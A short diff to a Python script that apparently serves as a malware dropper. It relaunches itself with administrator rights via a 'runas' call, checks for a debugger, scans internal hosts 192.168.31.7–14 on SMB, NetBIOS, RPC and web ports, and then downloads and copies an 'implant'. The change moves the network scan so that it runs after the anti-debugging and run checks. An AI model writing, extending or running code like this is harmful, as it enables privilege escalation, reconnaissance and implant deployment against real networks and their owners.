@@ -170,23 +170,12 @@ if __name__ == '__main__':
 
         ''')
 
-        hosts = []
-
         if sys.argv[-1] != ASADMIN:
             check_UAC()
             script = os.path.abspath(sys.argv[0])
             params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
             shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
 
-        for ip in range(7,15):
-            netRange = '192.168.31.'
-            host = netRange + str(ip)
-            hosts.append(host)
-        for host in hosts:
-            scan_ports = [80,135,443,445,137]
-            print ("[***] Starting a Portscan on host %s:\n" % host )
-            for port in scan_ports:
-                response = scan_host(host, port)
 
         if IsDebuggerPresent == True:
             print ("Debugger!")
@@ -211,6 +200,19 @@ if __name__ == '__main__':
 
         if run == 0:
             sys.exit(1)
+
+        hosts = []
+
+        for ip in range(7,15):
+            netRange = '192.168.31.'
+            host = netRange + str(ip)
+            hosts.append(host)
+
+        for host in hosts:
+            scan_ports = [80,135,443,445,137]
+            print ("[***] Starting a Portscan on host %s:\n" % host )
+            for port in scan_ports:
+                response = scan_host(host, port)
 
         download_Implant()
         implant_Copy()
